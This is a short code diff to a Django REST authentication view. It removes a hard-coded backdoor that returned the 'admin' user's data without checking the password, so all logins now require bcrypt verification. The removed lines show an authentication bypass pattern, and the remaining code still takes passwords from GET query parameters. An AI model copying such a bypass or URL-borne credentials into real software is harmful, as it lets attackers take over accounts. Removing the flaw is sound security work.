@@ -304,9 +304,7 @@ class ExampleAuthentication(APIView):
         password = request.GET.get('password')
         try:
             user = User.objects.get(login=username)
-            if username == 'admin':
-                user_serializer = UserSerializer(instance=user)
-                return Response(user_serializer.data)
+
             if bcrypt.checkpw(password.encode('utf-8'), user.password.encode('utf-8')):
                 user_serializer = UserSerializer(instance=user)
                 return Response(user_serializer.data)
